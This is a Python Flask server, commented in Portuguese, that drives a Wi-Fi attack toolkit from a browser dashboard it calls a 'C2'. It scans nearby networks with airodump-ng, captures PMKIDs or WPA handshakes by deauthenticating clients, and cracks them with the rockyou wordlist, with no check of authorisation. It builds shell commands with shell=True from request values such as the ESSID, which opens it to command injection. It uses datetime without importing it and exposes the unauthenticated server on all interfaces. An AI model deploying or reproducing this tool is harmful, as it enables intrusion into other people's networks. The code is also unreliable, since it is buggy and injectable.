import os
import time
import csv
import subprocess
import threading
from flask import Flask, render_template, request, jsonify

# Importa as funções principais do nosso script anterior (core da ferramenta)
from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash

app = Flask(__name__)

# Variáveis globais de controle de estado
CURRENT_MONITOR_IFACE = None
SCAN_PROCESS = None
CSV_PREFIX = "web_scan_results"

# --- Sistema de Logs e Relatório ---
SESSION_LOGS = []
COMMAND_HISTORY = []

def add_log(msg, is_command=False):
    timestamp = datetime.now().strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    SESSION_LOGS.append(formatted_msg)
    if is_command:
        COMMAND_HISTORY.append({"time": timestamp, "data": msg})
    print(formatted_msg)

@app.route('/')
def dashboard():
    """ Renderiza o Front-End Cyberpunk """
    return render_template('index.html')

@app.route('/api/logs', methods=['GET'])
def get_logs():
    return jsonify({"status": "success", "logs": SESSION_LOGS})

@app.route('/api/report', methods=['GET'])
def get_report():
    report_html = f"""
    <html>
    <head>
        <title>Relatório de Auditoria DSI</title>
        <style>
            body {{ font-family: sans-serif; background: #f4f4f4; padding: 20px; }}
            .report-container {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #2c3e50; border-bottom: 2px solid #2c3e50; padding-bottom: 10px; }}
            .command-log {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; }}
            .footer {{ margin-top: 20px; font-size: 0.8em; color: #7f8c8d; }}
        </style>
    </head>
    <body>
        <div class="report-container">
            <h1>Relatório de Auditoria Wi-Fi - DSI Expert</h1>
            <p><strong>Data:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <h3>Histórico de Comandos e Ações:</h3>
            <div class="command-log">
                {"<br>".join([f"[{c['time']}] {c['data']}" for c in COMMAND_HISTORY])}
            </div>
            <p class="footer">Gerado automaticamente pelo DSI Web Auditor System.</p>
        </div>
    </body>
    </html>
    """
    return report_html

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    stdout, stderr = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    interfaces = stdout.split('\n') if stdout else []
    return jsonify({
        "status": "success",
        "interfaces": [i for i in interfaces if i],
        "os_type": "linux"
    })

@app.route('/api/start_monitor', methods=['POST'])
def start_monitor():
    global CURRENT_MONITOR_IFACE
    data = request.get_json()
    iface = data.get('interface')
    
    if not iface:
        return jsonify({"status": "error", "message": "Nenhuma interface providenciada"}), 400
    
    add_log(f"Comando recebido: Armar modo monitor na interface {iface}", is_command=True)
    CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
    
    if CURRENT_MONITOR_IFACE:
        add_log(f"Sucesso: Interface {CURRENT_MONITOR_IFACE} em modo monitor.")
        return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
    else:
        add_log(f"Erro ao armar modo monitor na interface {iface}")
        return jsonify({"status": "error", "message": "Falha ao armar o modo monitor (veja logs no terminal)"}), 500

@app.route('/api/start_scan', methods=['POST'])
def start_scan():
    global SCAN_PROCESS, CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE:
        return jsonify({"status": "error", "message": "Modo monitor não está ativo."}), 400
    
    add_log(f"Iniciando Radar Airodump-ng na interface {CURRENT_MONITOR_IFACE}", is_command=True)
    # Limpa arquivos antigos
    run_command(f"rm -f {CSV_PREFIX}-01.*")
    
    # Roda o airodump silenciosamente no fundo para alimentar o CSV
    cmd = f"airodump-ng --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
    SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return jsonify({"status": "success", "message": "Radar ligado com sucesso."})

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    global SCAN_PROCESS
    if SCAN_PROCESS:
        add_log("Parando Radar de Espectro.", is_command=True)
        SCAN_PROCESS.terminate()
        run_command("killall airodump-ng", sudo=True)
        SCAN_PROCESS = None
    return jsonify({"status": "success", "message": "Radar desligado."})

@app.route('/api/get_networks', methods=['GET'])
def get_networks():
    csv_file = f"{CSV_PREFIX}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                in_ap_section = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID":
                        in_ap_section = True
                        continue
                    if row[0].strip() == "Station MAC": break
                    
                    if in_ap_section:
                        bssid = row[0].strip()
                        pwr = row[8].strip() # Signal PWR in CSV is column 9 (index 8)
                        channel = row[3].strip()
                        privacy = row[5].strip()
                        essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({
                                'bssid': bssid, 
                                'signal': pwr,
                                'channel': channel, 
                                'privacy': privacy, 
                                'essid': essid
                            })
        except Exception:
            pass
            
    # Ordena pelo sinal mais forte (menor número negativo)
    networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
    return jsonify({"status": "success", "networks": networks})

@app.route('/api/attack', methods=['POST'])
def launch_attack():
    global CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE:
        return jsonify({"status": "error", "message": "Nenhuma interface armada."})

    data = request.get_json()
    bssid = data.get('bssid')
    channel = data.get('channel')
    essid = data.get('essid')
    attack_type = data.get('attack_type')
    
    add_log(f"Iniciando Ataque {attack_type.upper()} contra {essid} ({bssid}) no canal {channel}", is_command=True)
    
    prefix = f"web_capture_{essid.replace(' ', '_')}"
    
    cap_file = None
    if attack_type == 'pmkid':
        add_log("Vetor: PMKID Stealth (Clientless)...")
        cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        if not cap_file:
             add_log("PMKID falhou. Tentando fallback para Handshake tradicional...")
             cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
    else:
        add_log("Vetor: Handshake Adaptativo (Deauth)...")
        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)

    if cap_file:
        add_log(f"Sucesso! Chave retida em: {cap_file}")
        wordlist = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(wordlist):
            add_log(f"Iniciando Crack de Senha em background usando: {wordlist}")
            threading.Thread(target=crack_hash, args=(cap_file, wordlist, bssid)).start()
            return jsonify({"status": "success", "message": "Handshake Retido. Cracking em background.", "cap_file": cap_file})
        else:
            add_log("Handshake capturado, mas wordlist padrão não encontrada para crack automático.")
            return jsonify({"status": "success", "message": f"Handshake salvo em {cap_file}.", "cap_file": cap_file})
            
    add_log("Ataque falhou: Alvo não respondeu aos estímulos.")
    return jsonify({"status": "error", "message": "O Roteador alvo bloqueou o ataque ou não há clientes conectados."})

@app.route('/api/restore', methods=['POST'])
def restore():
    global CURRENT_MONITOR_IFACE, SCAN_PROCESS
    add_log("Comando recebido: Restaurar sistema para modo civil", is_command=True)
    if SCAN_PROCESS:
        SCAN_PROCESS.terminate()
        run_command("killall airodump-ng", sudo=True)
        SCAN_PROCESS = None
        
    if CURRENT_MONITOR_IFACE:
        set_managed_mode(CURRENT_MONITOR_IFACE)
        CURRENT_MONITOR_IFACE = None
        add_log("Sistema restaurado com sucesso.")
        return jsonify({"status": "success", "message": "Placa de rede civil restabelecida."})
    
    return jsonify({"status": "success", "message": "Nada a restaurar."})

if __name__ == '__main__':
    # Verifica se Flask tá rodando como root
    if os.geteuid() != 0:
        print("[!] ATENÇÃO: Para o C2 controlar as placas Wi-Fi, o Flask DEVE ser executado como root.")
        print("Digite: sudo python3 web_auditor.py")
        exit(1)
        
    print("\n" + "="*50)
    print(" >>> C2 SERVER ONLINE (PORTA 5000) <<< ")
    print(" 1. Abra seu navegador web.")
    print(" 2. Acesse a URL secreta: http://localhost:5000")
    print("="*50 + "\n")
    
    # Roda o servidor Flask em modo debug leve (threaded)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
